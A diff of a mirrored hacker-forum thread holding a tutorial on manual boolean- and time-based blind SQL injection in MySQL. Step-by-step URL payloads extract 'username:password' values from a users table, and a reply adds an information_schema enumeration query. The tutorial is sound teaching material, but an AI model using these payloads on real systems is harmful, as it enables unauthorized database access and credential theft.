@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=1990&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=1990&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> MySQL: Blind Injection steps - Manually</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,105 +41,105 @@
 		<div class="title">MySQL: Blind Injection steps - Manually</div>
 	
 	<div class="content">
-		<blockquote class="restore">While preparing for an upcoming presentation, I came across Blind SQL Injection. Following steps I found helpful and you might find it useful.<br />
-<br />
-There are 2 types of Blind SQL Injections:<br />
-1. Normal Blind =&gt; Where you get TRUE/FALSE responses based on output of SQL query. This is visible change in page.<br />
-2. Totally Blind =&gt; No change in output for TRUE/FALSE condition.<br />
-<br />
-<b>1. Normal Blind:<br />
-Vulnerable URL:</b><br />
-hxxp://site/page.php?id=1<br />
-<br />
-<b>TRUE Response:</b><br />
-hxxp://site/page.php?id=1 AND 1=1<br />
-<br />
-<b>FALSE Response:</b><br />
-hxxp://site/page.php?id=1 AND 1=2<br />
-<br />
-<b>Check Version:</b><br />
-hxxp://site/page.php?id=1 AND substring(version(),1,1)=4 &lt;-- FALSE Response<br />
-hxxp://site/page.php?id=1 AND substring(version(),1,1)=5 &lt;-- TRUE Response<br />
-<br />
-Database version is MySQL 5.x.x.<br />
-<br />
-<b>Table &amp; Columns:</b><br />
-We need to guess table &amp; column names. For this, subselect should be supported.<br />
-<br />
-<b>Check subselect:</b><br />
-hxxp://site/page.php?id=1 AND (select 1)=1 &lt;--  This should be TRUE Response -- subselect supported<br />
-<br />
-<b>Guessing Table name:</b><br />
-hxxp://site/page.php?id=1 AND (select 1 from admin limit 0,1)=1 &lt;-- FALSE<br />
-hxxp://site/page.php?id=1 AND (select 1 from users limit 0,1)=1 &lt;-- TRUE<br />
-<br />
-Table found 'users'.<br />
-<br />
-Here we trying to get 1st row as 1, so when table exists, the query returns 1 and conditions is TRUE. When the table is not there, it's FALSE as there will be error in query execution which is not visible to us.<br />
-<br />
-<b>Guessing Columns:</b><br />
-hxxp://site/page.php?id=1 AND (select substring(concat(1,pass),1,1) from users limit 0,1)=1 &lt;-- FALSE<br />
-hxxp://site/page.php?id=1 AND (select substring(concat(1,password),1,1) from users limit 0,1)=1 &lt;-- TRUE<br />
-<br />
-Column 'password' found.<br />
-<br />
-Here we concating 1 with value from supplied column name &amp; then check 1st char with substring(). If column exists, it'll return 1+(password value of 1st row) and substring will pull out 1st char which is '1' and comparing with 1 which will be TRUE. If column does not exists, it's return nothing, which FALSE the condition.<br />
-<br />
-<b>Data Mining:</b><br />
-<br />
-We found table name as 'users' &amp; columns as 'password' and 'username'.<br />
-<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;80 --&gt; TRUE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;90 --&gt; TRUE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;100 --&gt; FALSE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;96 --&gt; TRUE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;97 --&gt; FALSE<br />
-<br />
-This means 1st character is CHAR(97)='a'. <br />
-<br />
-Here we are 1st concating username with password values for 1st row (Limit) which will be in formation like 'username:password' and then coverting 1st character of it in ascii and checking with numeric value. If response is TRUE, increase and check till get the first FALSE.<br />
-<br />
-Now to know 2nd character, just increase the char in substring() and repeat the process.<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;80 --&gt; TRUE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;90 --&gt; TRUE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;100 --&gt; FALSE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;99 --&gt; TRUE<br />
-hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;100 --&gt; FALSE<br />
-<br />
-Second character is CHAR(100) = 'd'<br />
-<br />
-The end of string will be TRUE for &gt;0 condition. So you will come to know that you reached the end.<br />
-<br />
-<b>2. Totally Blind:</b><br />
-As this type didn't have any TRUE/FALSE responses, we need to use time-based injection. Use <b>IF()</b> for condition and <b>BENCHMARK()</b> for time delay. These 2 can be used with UNION SELECT, but again finding correct number of columns is pain as there is no direct method i know.<br />
-<br />
-<b>Detecting Version:</b><br />
-hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING(version(),1,1)=5,BENCHMARK(5000000,MD  5(CHAR(1))),null),null ---&gt; delay of 5 secs (TRUE)<br />
-hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING(version(),1,1)=4,BENCHMARK(5000000,MD  5(CHAR(1))),null),null ---&gt; no delay (FALSE)<br />
-When the condition in IF() is TRUE, you can see a delay of few seconds in response as compared to the one when condition results in FALSE.<br />
-<br />
-<b>Table and column guessing:</b><br />
-As described in 'Normal Blind', the same process can be followed here to guess the table and column names.<br />
-<br />
-<b>Table name guessing:</b><br />
-hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING((select 1 from users limit 0,1),1,1)=1,BENCHMARK(5000000,MD5(CHAR(1))),null),  null<br />
-<br />
-Delay if table 'users' exists or no delay if not exists.<br />
-<br />
-<b>Column name Guessing:</b><br />
-hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING((select substring(concat(1,pass),1,1) from users limit 0,1),1,1)=1,BENCHMARK(5000000,MD5(CHAR(1))),null),  null<br />
-<br />
-Delay if column 'pass' exists or no delay if not exists.<br />
-<br />
-<b>Getting Data:</b><br />
-hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING(user,1,1)=CHAR(97),BENCHMARK(5000000,  MD5(CHAR(1))),null),null FROM users limit 0,1<br />
-<br />
-Delay if first character of 1st row of 'user' column in 'users' table is 'a' or no delay if it's not.<br />
-<br />
-This way we can mine data. As you seen, this is time consuming. Tools like SQLMap are really good at this type of operations. But it always good to know the basics before firing any tool. You can use DVWA Blind SQL Injection in 'Medium' security to test these attacks.<br />
-<br />
-Hope this helps someone , someday, somewhere.<br />
-<br />
+		<blockquote class="restore">While preparing for an upcoming presentation, I came across Blind SQL Injection. Following steps I found helpful and you might find it useful.<br/>
+<br/>
+There are 2 types of Blind SQL Injections:<br/>
+1. Normal Blind =&gt; Where you get TRUE/FALSE responses based on output of SQL query. This is visible change in page.<br/>
+2. Totally Blind =&gt; No change in output for TRUE/FALSE condition.<br/>
+<br/>
+<b>1. Normal Blind:<br/>
+Vulnerable URL:</b><br/>
+hxxp://site/page.php?id=1<br/>
+<br/>
+<b>TRUE Response:</b><br/>
+hxxp://site/page.php?id=1 AND 1=1<br/>
+<br/>
+<b>FALSE Response:</b><br/>
+hxxp://site/page.php?id=1 AND 1=2<br/>
+<br/>
+<b>Check Version:</b><br/>
+hxxp://site/page.php?id=1 AND substring(version(),1,1)=4 &lt;-- FALSE Response<br/>
+hxxp://site/page.php?id=1 AND substring(version(),1,1)=5 &lt;-- TRUE Response<br/>
+<br/>
+Database version is MySQL 5.x.x.<br/>
+<br/>
+<b>Table &amp; Columns:</b><br/>
+We need to guess table &amp; column names. For this, subselect should be supported.<br/>
+<br/>
+<b>Check subselect:</b><br/>
+hxxp://site/page.php?id=1 AND (select 1)=1 &lt;--  This should be TRUE Response -- subselect supported<br/>
+<br/>
+<b>Guessing Table name:</b><br/>
+hxxp://site/page.php?id=1 AND (select 1 from admin limit 0,1)=1 &lt;-- FALSE<br/>
+hxxp://site/page.php?id=1 AND (select 1 from users limit 0,1)=1 &lt;-- TRUE<br/>
+<br/>
+Table found 'users'.<br/>
+<br/>
+Here we trying to get 1st row as 1, so when table exists, the query returns 1 and conditions is TRUE. When the table is not there, it's FALSE as there will be error in query execution which is not visible to us.<br/>
+<br/>
+<b>Guessing Columns:</b><br/>
+hxxp://site/page.php?id=1 AND (select substring(concat(1,pass),1,1) from users limit 0,1)=1 &lt;-- FALSE<br/>
+hxxp://site/page.php?id=1 AND (select substring(concat(1,password),1,1) from users limit 0,1)=1 &lt;-- TRUE<br/>
+<br/>
+Column 'password' found.<br/>
+<br/>
+Here we concating 1 with value from supplied column name &amp; then check 1st char with substring(). If column exists, it'll return 1+(password value of 1st row) and substring will pull out 1st char which is '1' and comparing with 1 which will be TRUE. If column does not exists, it's return nothing, which FALSE the condition.<br/>
+<br/>
+<b>Data Mining:</b><br/>
+<br/>
+We found table name as 'users' &amp; columns as 'password' and 'username'.<br/>
+<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;80 --&gt; TRUE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;90 --&gt; TRUE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;100 --&gt; FALSE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;96 --&gt; TRUE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;97 --&gt; FALSE<br/>
+<br/>
+This means 1st character is CHAR(97)='a'. <br/>
+<br/>
+Here we are 1st concating username with password values for 1st row (Limit) which will be in formation like 'username:password' and then coverting 1st character of it in ascii and checking with numeric value. If response is TRUE, increase and check till get the first FALSE.<br/>
+<br/>
+Now to know 2nd character, just increase the char in substring() and repeat the process.<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;80 --&gt; TRUE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;90 --&gt; TRUE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;100 --&gt; FALSE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;99 --&gt; TRUE<br/>
+hxxp://site/page.php?id=1 AND ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;100 --&gt; FALSE<br/>
+<br/>
+Second character is CHAR(100) = 'd'<br/>
+<br/>
+The end of string will be TRUE for &gt;0 condition. So you will come to know that you reached the end.<br/>
+<br/>
+<b>2. Totally Blind:</b><br/>
+As this type didn't have any TRUE/FALSE responses, we need to use time-based injection. Use <b>IF()</b> for condition and <b>BENCHMARK()</b> for time delay. These 2 can be used with UNION SELECT, but again finding correct number of columns is pain as there is no direct method i know.<br/>
+<br/>
+<b>Detecting Version:</b><br/>
+hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING(version(),1,1)=5,BENCHMARK(5000000,MD  5(CHAR(1))),null),null ---&gt; delay of 5 secs (TRUE)<br/>
+hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING(version(),1,1)=4,BENCHMARK(5000000,MD  5(CHAR(1))),null),null ---&gt; no delay (FALSE)<br/>
+When the condition in IF() is TRUE, you can see a delay of few seconds in response as compared to the one when condition results in FALSE.<br/>
+<br/>
+<b>Table and column guessing:</b><br/>
+As described in 'Normal Blind', the same process can be followed here to guess the table and column names.<br/>
+<br/>
+<b>Table name guessing:</b><br/>
+hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING((select 1 from users limit 0,1),1,1)=1,BENCHMARK(5000000,MD5(CHAR(1))),null),  null<br/>
+<br/>
+Delay if table 'users' exists or no delay if not exists.<br/>
+<br/>
+<b>Column name Guessing:</b><br/>
+hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING((select substring(concat(1,pass),1,1) from users limit 0,1),1,1)=1,BENCHMARK(5000000,MD5(CHAR(1))),null),  null<br/>
+<br/>
+Delay if column 'pass' exists or no delay if not exists.<br/>
+<br/>
+<b>Getting Data:</b><br/>
+hxxp://site/page.php?id=1 UNION SELECT IF(SUBSTRING(user,1,1)=CHAR(97),BENCHMARK(5000000,  MD5(CHAR(1))),null),null FROM users limit 0,1<br/>
+<br/>
+Delay if first character of 1st row of 'user' column in 'users' table is 'a' or no delay if it's not.<br/>
+<br/>
+This way we can mine data. As you seen, this is time consuming. Tools like SQLMap are really good at this type of operations. But it always good to know the basics before firing any tool. You can use DVWA Blind SQL Injection in 'Medium' security to test these attacks.<br/>
+<br/>
+Hope this helps someone , someday, somewhere.<br/>
+<br/>
 AMol NAik</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -153,14 +150,14 @@ AMol NAik</blockquote>
 	
 	
 	<div class="content">
-		<blockquote class="restore">Good. However, since the MySQL version is 5.x.x, you can take the help of information_schema to enumerate rather than guessing table names.<br />
-<br />
-It need not always be users. To help you in this case,<br />
-<br />
+		<blockquote class="restore">Good. However, since the MySQL version is 5.x.x, you can take the help of information_schema to enumerate rather than guessing table names.<br/>
+<br/>
+It need not always be users. To help you in this case,<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">hxxp://site.com/page.php?id=1 and ascii(substring((select group_concat(table_name) from information_schema.columns where column_name like 0x257061737325),1,1))&gt;0</code><hr />
-</div>Enumerates all the table names with a column containing the string, &quot;pass&quot;. Now, this should work even if the column name is, pass/passwd/password and so on.</blockquote>
+	<hr/><code class="bbcode_code">hxxp://site.com/page.php?id=1 and ascii(substring((select group_concat(table_name) from information_schema.columns where column_name like 0x257061737325),1,1))&gt;0</code><hr/>
+</div>Enumerates all the table names with a column containing the string, "pass". Now, this should work even if the column name is, pass/passwd/password and so on.</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_3">
 	<div class="header">
@@ -172,8 +169,8 @@ It need not always be users. To help you in this case,<br />
 		<div class="title">Nice article</div>
 	
 	<div class="content">
-		<blockquote class="restore">Hi Amol and codeinjector<br />
-<br />
+		<blockquote class="restore">Hi Amol and codeinjector<br/>
+<br/>
 its a wonderful tutorial. Thanks for giving valuable information.</blockquote>
 	</div>
 </li>
@@ -182,14 +179,14 @@ its a wonderful tutorial. Thanks for giving valuable information.</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:07 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:07 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -207,7 +204,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=1990&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=1990&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT --></html>
